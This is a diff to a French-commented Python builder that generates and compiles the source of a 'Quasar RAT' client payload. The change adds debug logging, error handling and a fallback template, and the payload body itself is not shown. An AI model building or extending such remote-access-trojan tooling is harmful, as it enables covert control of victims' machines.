@@ -396,7 +396,11 @@ def generate_payload_source(config):
     """
     Génère le code source Python du payload Quasar
     """
-    source_template = '''
+    print("📝 [DEBUG] generate_payload_source appelée")
+    print(f"⚙️ [DEBUG] Configuration reçue: {json.dumps(config, indent=2)}")
+    
+    try:
+        source_template = '''
 import socket
 import threading
 import time
@@ -636,8 +640,29 @@ if __name__ == "__main__":
     client = QuasarClient()
     client.run()
 '''.format(**config)
-    
-    return source_template
+        
+        print(f"✅ [DEBUG] Template généré avec succès: {len(source_template)} caractères")
+        return source_template
+        
+    except Exception as e:
+        print("=" * 80)
+        print("❌ [DEBUG] ERREUR LORS DE LA GÉNÉRATION DU CODE SOURCE")
+        print("=" * 80)
+        print(f"❌ [DEBUG] Type d'erreur: {type(e).__name__}")
+        print(f"❌ [DEBUG] Message d'erreur: {str(e)}")
+        import traceback
+        print(f"❌ [DEBUG] Stack trace: {traceback.format_exc()}")
+        print("=" * 80)
+        
+        # Retourner un template de base en cas d'erreur
+        fallback_template = f"""# Quasar RAT Client - Version Éducative
+# Erreur lors de la génération: {str(e)}
+# Configuration: {json.dumps(config, indent=2)}
+
+print("Client Quasar - Version de base")
+print("Configuration: {config}")
+"""
+        return fallback_template
 
 def compile_payload_source(source_code, config):
     """
